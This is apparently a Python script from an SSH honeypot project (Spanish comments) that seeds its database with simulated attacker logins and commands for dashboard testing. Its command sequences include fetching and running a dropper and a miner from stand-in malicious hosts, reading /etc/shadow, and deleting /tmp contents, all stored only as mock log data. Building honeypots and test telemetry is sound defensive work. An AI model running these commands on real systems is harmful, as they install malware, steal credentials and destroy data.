import socket
import time
import random
import paramiko
from honeypot.database import init_db, log_auth_attempt, log_command

# IPs de prueba simulando origenes globales de botnets
SAMPLE_ATTACKERS = [
    {"ip": "185.220.101.5", "country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lon": 8.6821, "isp": "Tor Exit Node"},
    {"ip": "45.154.255.89", "country": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6173, "isp": "Mirai Botnet Host"},
    {"ip": "103.149.28.130", "country": "China", "city": "Beijing", "lat": 39.9042, "lon": 116.4074, "isp": "ChinaNet"},
    {"ip": "194.26.29.112", "country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041, "isp": "Hosting B.V."},
    {"ip": "198.235.24.162", "country": "United States", "city": "New York", "lat": 40.7128, "lon": -74.0060, "isp": "Cloud Provider"},
    {"ip": "177.54.144.12", "country": "Brazil", "city": "Sao Paulo", "lat": -23.5505, "lon": -46.6333, "isp": "Telecom Brasil"},
    {"ip": "14.161.42.10", "country": "Vietnam", "city": "Hanoi", "lat": 21.0285, "lon": 105.8542, "isp": "VNPT Corp"},
]

COMMON_USERNAMES = ["root", "admin", "ubuntu", "test", "oracle", "support", "user", "guest"]
COMMON_PASSWORDS = ["123456", "password", "root", "admin", "12345678", "qwerty", "toor", "cisco", "pass123", "default"]

ATTACK_COMMAND_SEQUENCES = [
    ["uname -a", "whoami", "id", "wget http://malicious-c2.net/dropper.sh", "chmod +x dropper.sh", "./dropper.sh"],
    ["cat /etc/passwd", "cat /etc/shadow", "ls -la", "exit"],
    ["pwd", "whoami", "curl -O http://evil-miner.org/xmrig", "exit"],
    ["id", "cat /proc/cpuinfo", "uptime", "exit"],
    ["uname -mrs", "ps aux", "rm -rf /tmp/*", "exit"]
]

def generate_mock_telemetry(num_attempts: int = 50):
    """
    Genera telemetria realista en la base de datos para pruebas inmediatas del dashboard.
    """
    init_db()
    print(f"[*] Inyectando {num_attempts} intentos de ataque simulados con telemetria...")

    for i in range(num_attempts):
        attacker = random.choice(SAMPLE_ATTACKERS)
        user = random.choice(COMMON_USERNAMES)
        pwd = random.choice(COMMON_PASSWORDS)

        # 10% de exito (llegar a la fake shell)
        is_success = random.random() < 0.15 or (user in ("root", "admin") and pwd in ("root", "admin", "123456"))
        status = "SUCCESS" if is_success else "FAILED"

        log_auth_attempt(
            ip=attacker["ip"],
            port=random.randint(40000, 65000),
            username=user,
            password=pwd,
            status=status,
            geo_info=attacker
        )

        if is_success:
            session_id = f"mock-{random.randint(1000, 9999)}"
            sequence = random.choice(ATTACK_COMMAND_SEQUENCES)
            for cmd in sequence:
                log_command(session_id, attacker["ip"], user, cmd)

    print("[+] Datos de prueba cargados con exito.")

if __name__ == "__main__":
    generate_mock_telemetry()
